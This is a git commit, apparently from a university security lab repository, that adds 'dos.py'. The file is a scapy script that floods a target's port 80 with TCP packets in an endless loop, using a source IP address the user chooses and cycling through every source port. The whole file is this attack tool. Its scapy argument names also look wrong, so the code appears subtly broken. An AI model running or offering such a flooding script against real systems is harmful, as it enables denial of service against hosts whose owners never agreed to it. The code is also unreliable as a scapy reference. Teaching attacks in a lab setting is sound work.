43e021b3bbae32ecb630099bda318d5574ad32f4
uwacyber <98138371+uwacyber@users.noreply.github.com>
2022-07-19 12:07:16 +0800

    Create dos.py

---
+++ cits3006-labs/files/dos.py
@@ -0,0 +1,28 @@
+from scapy.all import *
+import argparse
+
+def dos(source_IP, target_IP):
+  i = 1
+  
+  while True:
+    for source_port in range(1, 65535):
+      IP1 = IP(source_IP = source_IP, destination = target_IP)
+      TCP1 = TCP(srcport = source_port, dstport = 80)
+      pkt = IP1 / TCP1
+      send(pkt, inter = .001)
+
+      if((i % 100) == 0):
+        print ("packets sent ", i)
+      i = i + 1
+      
+if __name__ == "__main__":
+  parser = argparse.ArgumentParser(description="DoS script")
+  parser.add_argument("source", help="The source IP address")
+  parser.add_argument("target", help="The target IP address")
+  args = parser.parse_args()
+  
+  try:
+    #run the script using the specified source and target IP addresses
+    dos(args.source, args.target)
+  except KeyboardInterrupt:
+    print("[!] Detected CTRL+C ! quitting, please wait...")
